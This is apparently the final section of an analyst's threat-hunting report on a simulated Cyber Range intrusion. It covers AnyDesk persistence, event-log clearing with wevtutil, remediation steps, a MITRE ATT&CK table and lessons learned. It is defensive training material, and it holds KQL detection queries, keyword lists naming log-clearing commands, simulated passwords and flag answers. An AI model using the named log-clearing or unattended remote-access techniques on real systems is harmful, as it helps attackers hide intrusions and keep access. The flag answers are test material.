| Tactic | Persistence |
| Technique | T1053.005: Scheduled Task/Job: Scheduled Task |

---

### 🚩 Q41: Persistence | Remote Access Tool

**Objective**\
Identify the legitimate remote management application installed for unattended access.

**Hunt Question**\
What remote access software was installed?

**Answer:** `AnyDesk`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:30:00) .. datetime(2026-02-10 23:00:00))
| where EventCode_s in ("1", "4688")
| where CommandLine_s has_any ("schtasks", "sc create", "sc config", "AnyDesk", "anydesk", "TeamViewer", "vnc")
    or Image_s has_any ("schtasks", "AnyDesk", "anydesk")
| project TimeGenerated, Computer, Image_s, CommandLine_s
| sort by TimeGenerated asc
```

**Key Observations**
- `AnyDesk` appeared in process execution telemetry, installed silently.
- AnyDesk was also deployed during the BROKER investigation, its reappearance here continues the cross-case TTP pattern alongside the `cloud-endpoint.net` infrastructure overlap.

**Analysis**\
AnyDesk provides a remote access channel independent of the beacon. Even if `update.exe` is removed and the `WindowsUpdate` task is deleted, a configured AnyDesk instance gives the attacker a return path. All three persistence mechanisms must be addressed.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Persistence |
| Technique | T1219: Remote Access Software |

---

### 🚩 Q42: Persistence | Remote Access Configuration

**Objective**\
Confirm the full path of the AnyDesk configuration file modified to enable unattended access.

**Hunt Question**\
What was the full path of the AnyDesk configuration file?

**Answer:** `C:\ProgramData\AnyDesk\system.conf`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:30:00) .. datetime(2026-02-10 23:00:00))
| where EventCode_s in ("1", "4688")
| where CommandLine_s has_any ("schtasks", "sc create", "sc config", "AnyDesk", "anydesk", "TeamViewer", "vnc")
    or Image_s has_any ("schtasks", "AnyDesk", "anydesk")
| project TimeGenerated, Computer, Image_s, CommandLine_s
| sort by TimeGenerated asc
```

**Key Observations**
- Commands referencing `C:\ProgramData\AnyDesk\system.conf` appeared alongside the AnyDesk installation event.
- The `C:\ProgramData\` path means the configuration applies system-wide and survives user account changes.

**Analysis**\
`system.conf` is what converts AnyDesk from interactive to unattended. Without this configuration, AnyDesk requires a local user to accept incoming connections. Remediation must remove AnyDesk entirely, not just the configuration file.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Persistence |
| Technique | T1219: Remote Access Software |

---

### 🚩 Q43: Anti-Forensics | Anti-Forensics Tool

**Objective**\
Identify the built-in utility used to clear event logs on the Domain Controller.

**Hunt Question**\
What tool was used to clear event logs?

**Answer:** `wevtutil.exe`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:30:00) .. datetime(2026-02-10 23:00:00))
| where Computer startswith "EC2AMAZ-EEU3IA2"
| where EventCode_s in ("1", "4688")
| where CommandLine_s has_any ("cl Security", "cl System", "cl Application", "Clear-EventLog", "Remove-EventLog", "auditpol /clear")
| project TimeGenerated, Computer, Image_s, CommandLine_s
| sort by TimeGenerated asc
```

**Key Observations**
- `wevtutil.exe cl Security` and `wevtutil.exe cl System` appeared in Sysmon telemetry on the DC.
- Sysmon captured these commands precisely because it writes to its own operational channel, separate from the logs being cleared.

**Analysis**\
The attacker cleared the evidence of their lateral movement and account creation activity. The Sysmon log survived because it was not targeted. That survival is the sole reason the DC-side chain is fully reconstructable. Real-time off-host Sysmon forwarding removes the attacker's ability to erase this evidence even if they had targeted Sysmon explicitly.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Defense Evasion |
| Technique | T1070.001: Indicator Removal: Clear Windows Event Logs |

---

### 🚩 Q44: Anti-Forensics | Cleared Logs

**Objective**\
Confirm which specific event logs were cleared on the DC.

**Hunt Question**\
What two logs were cleared?

**Answer:** `Security, System`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:30:00) .. datetime(2026-02-10 23:00:00))
| where Computer startswith "EC2AMAZ-EEU3IA2"
| where EventCode_s in ("1", "4688")
| where CommandLine_s has_any ("cl Security", "cl System", "cl Application", "Clear-EventLog", "Remove-EventLog", "auditpol /clear")
| project TimeGenerated, Computer, Image_s, CommandLine_s
| sort by TimeGenerated asc
```

**Key Observations**
- Security log cleared: removed logon records (4624), account creation (4720), and group membership changes (4732).
- System log cleared: removed service installation records (7045) documenting the psexec-style lateral movement chain.
- The Application log was not cleared, the attacker targeted only the logs most directly incriminating.

**Analysis**\
The selective clearing of Security and System reflects awareness of which logs hold the most direct evidence of the operation. The failure to also clear Sysmon is what made this investigation fully reconstructable from the DC side. Every DC-side finding in Section 5 rests on Sysmon telemetry that survived the clearing attempt.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Defense Evasion |
| Technique | T1070.001: Indicator Removal: Clear Windows Event Logs |

---

## Conclusion

EmberForge: Source Leak documents a targeted, full-domain intrusion progressing from initial workstation access to `ntds.dit` extraction and confirmed data exfiltration within a single operational window of approximately eight minutes. The attacker demonstrated consistent tradecraft: ISO delivery to bypass SmartScreen, DLL execution via `rundll32.exe`, a two-stage injection chain, UAC bypass via `fodhelper.exe` registry hijack, direct syscall credential dumping, and a clear preference for native Windows utilities at every stage. Three plaintext credentials were captured in command-line telemetry, the attacker consistently prioritised speed over OPSEC at moments requiring authentication, and Sysmon recorded all of them permanently.

The domain compromise is the defining consequence. `ntds.dit` access means every account in `emberforge.local` must be treated as exposed. The backdoor account `svc_backup` with Domain Admins membership, the `WindowsUpdate` scheduled task, and the AnyDesk unattended configuration are three independent re-entry paths that each require explicit remediation. Addressing one without the others leaves the environment exposed.

The `cloud-endpoint.net` infrastructure overlap with BROKER and BUYER is the most significant analytical connection in this investigation. `cdn.cloud-endpoint.net` (C2) and `sync.cloud-endpoint.net` (staging) have now appeared across three separate cases in this range environment. This warrants a dedicated threat intelligence flag and priority blocking across any environment where these domains have been observed.

The Sysmon log's survival on the DC was the single most important factor in the reconstructability of this case. Security and System logs were cleared. Sysmon captured the clearing commands and preserved everything else. Without Sysmon on the DC, the entire Phase 5 analysis would have been inference rather than confirmed telemetry.

---

## Remediation Recommendations

### Immediate Priority : Domain Compromise
- Reset all domain account passwords; treat every account in `emberforge.local` as potentially compromised following `ntds.dit` extraction
- Double-reset the `krbtgt` account to invalidate all outstanding Kerberos tickets
- Disable and delete the `svc_backup` backdoor account; audit Domain Admins for unrecognised entries
- Rotate `EmberForge2024!` immediately, confirmed in telemetry as a high-privilege credential

### Containment : Infected Hosts
- Isolate and re-image all three compromised endpoints: `EC2AMAZ-B9GHHO6`, `EC2AMAZ-16V3AU4`, `EC2AMAZ-EEU3IA2`
- Remove AnyDesk from all three hosts; audit the broader environment for additional deployments pushed via the `tools` share
- Remove the `WindowsUpdate` scheduled task; audit all scheduled tasks for entries pointing to `C:\Users\Public\` or other world-writable paths
- Remove the `tools` share from the workstation and the `SMB` firewall rule

### Infrastructure Blocking
- Block `cdn.cloud-endpoint.net`, `sync.cloud-endpoint.net`, and `104.21.30.237` at DNS and perimeter, these overlap with BROKER and BUYER IOCs
- Submit a takedown request to Mega for `jwilson.vhr@proton.me`; provide `66.203.125.15` as the confirmed upload destination
- Alert on any future `rclone.exe` execution environment-wide

### Data Scope and Notification
- Confirm the full contents of `C:\GameDev` for breach notification scope; engage legal counsel
- Preserve Sysmon logs from all three hosts before re-imaging, they are the primary evidence record

### ISO Delivery Controls
- Implement Group Policy to prevent standard users from mounting ISO, VHD, and IMG files
- Alert on `rundll32.exe` loading DLLs from non-C: drive paths

### Detection Hardening
- Deploy Sysmon on all Domain Controllers with real-time off-host log forwarding
- Alert on `vssadmin.exe` creating shadow copies on DCs
- Alert on `wevtutil cl` commands on any host
- Alert on EventCode 4720 and 4732 on DCs with real-time notification
- Alert on `DelegateExecute` writes under any `HKCU\Software\Classes\` shell command path
- Alert on EventCode 8 (CreateRemoteThread) from unexpected source processes
- Alert on EventCode 7045 with random-alphanumeric service names
- Alert on `certutil.exe` with `-urlcache` or `-split -f` in the command line

---

## 🧭 MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Confidence |
|---|---|---|---|
| Initial Access | T1566.001 | Phishing: Spearphishing Attachment | 🔴 High |
| Initial Access | T1553.005 | Subvert Trust Controls: Mark-of-the-Web Bypass (ISO) | 🔴 High |
| Execution | T1204.002 | User Execution: Malicious File | 🔴 High |
| Execution | T1218.011 | System Binary Proxy Execution: Rundll32 | 🔴 High |
| Persistence | T1053.005 | Scheduled Task/Job: Scheduled Task | 🔴 High |
| Persistence | T1219 | Remote Access Software (AnyDesk) | 🔴 High |
| Persistence | T1136.002 | Create Account: Domain Account | 🔴 High |
| Privilege Escalation | T1548.002 | Abuse Elevation Control Mechanism: Bypass UAC (fodhelper) | 🔴 High |
| Privilege Escalation | T1098 | Account Manipulation (Domain Admins) | 🔴 High |
| Defense Evasion | T1036.005 | Masquerading: Match Legitimate Name or Location | 🔴 High |
| Defense Evasion | T1055 | Process Injection | 🔴 High |
| Defense Evasion | T1562.004 | Impair Defenses: Disable or Modify System Firewall | 🔴 High |
| Defense Evasion | T1105 | Ingress Tool Transfer | 🔴 High |
| Defense Evasion | T1070.001 | Indicator Removal: Clear Windows Event Logs | 🔴 High |
| Credential Access | T1003.001 | OS Credential Dumping: LSASS Memory | 🔴 High |
| Credential Access | T1003.003 | OS Credential Dumping: NTDS | 🔴 High |
| Credential Access | T1078.002 | Valid Accounts: Domain Accounts | 🔴 High |
| Discovery | T1087.002 | Account Discovery: Domain Account | 🔴 High |
| Discovery | T1069.002 | Permission Groups Discovery: Domain Groups | 🔴 High |
| Discovery | T1018 | Remote System Discovery | 🔴 High |
| Discovery | T1033 | System Owner/User Discovery | 🔴 High |
| Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | 🔴 High |
| Lateral Movement | T1078.002 | Valid Accounts: Domain Accounts (NTLM failure then pivot) | 🟠 Medium |
| Collection | T1560.001 | Archive Collected Data: Archive via Utility | 🔴 High |
| Collection | T1074.001 | Data Staged: Local Data Staging | 🔴 High |
| Exfiltration | T1567.002 | Exfiltration Over Web Service: Exfiltration to Cloud Storage | 🔴 High |

> 🔴 **High**, Directly observed in telemetry and confirmed by flag output\
> 🟠 **Medium**, Strongly supported by correlated behaviour; outcome partially inferred

The ATT&CK coverage is weighted most heavily toward **Defense Evasion**, **Credential Access**, and **Exfiltration**. Defense evasion runs through every phase: ISO delivery, masqueraded binary names, a two-stage injection chain, UAC bypass, direct syscall LSASS dumping, and log clearing. The credential access sequence (LSASS on the workstation, `ntds.dit` on the DC) reflects an attacker who planned from the outset to own the full domain. The `cloud-endpoint.net` infrastructure overlap across BROKER, BUYER, and EmberForge is not captured in any single ATT&CK technique but is the most operationally significant analytical finding in the hunt.

---

## Final Thoughts & What I Learned

The most important methodological lesson from EmberForge is leading with impact. The CISO brief was explicit: scope the breach first, trace the path second. Beginning with `Compress-Archive` and `rclone` telemetry meant the primary breach artifacts (`C:\GameDev`, `jwilson.vhr@proton.me`, `66.203.125.15`) were confirmed within the first minutes of the hunt. In a real incident, that impact scoping drives breach notification timelines and legal decisions, and it does not require knowing how the attacker got in.

The timestamp drift was the most disorienting technical challenge. The briefing stated 30 January 2026. The telemetry showed 10 February 2026, the ingestion date, not the event date. Every query written against the briefing's stated window returned empty results. The data dictionary's guidance on time filtering and the need to inspect `TimeGenerated` against the actual ingestion window was essential context that needed to be applied before any other hunting could begin. The lesson is simple: always confirm the actual data time range before building filters, especially in custom-ingested tables where `TimeGenerated` may not reflect event occurrence.

The `cloud-endpoint.net` infrastructure connection across BROKER, BUYER, and EmberForge was unexpected. Seeing `cdn.cloud-endpoint.net` appear as the C2 domain (after having seen it in the earlier cases) immediately elevated the analytical frame. Carrying IOCs from prior investigations into new ones is a habit worth building explicitly into any threat hunting workflow. The connection only becomes visible if you are looking for it.

The three plaintext credential exposures (`Summer2024!`, `P@ssw0rd123!`, `EmberForge2024!`) all followed the same pattern: command-line argument, interactive troubleshooting, Sysmon records it all. The detection engineering implication is direct, hunting `CommandLine_s` for authentication argument patterns (`--password`, `/user:`, `-pass`, `net use ... /user:`) is high-return work that requires no network decryption and no memory forensics.

The Sysmon survival on the DC made the investigation fully reconstructable despite log clearing. That is not guaranteed in real environments. The real defensive posture is forwarding Sysmon off-host in real time, not hoping the attacker misses it locally.

---

## Credits

Thanks to the LogN Pacific team and Mohammed A. for the EmberForge: Source Leak scenario design and Cyber Range environment,  and to Josh Madakor for the ongoing threat hunting education framework that underpins how these investigations are approached.

---

## Disclaimer

This report is based on a controlled Cyber Range scenario. All systems, users, domains, IP addresses, files, hashes, email addresses, and passwords referenced in this document are simulated for training and investigation practice. No real infrastructure, organisation, or individuals are represented.
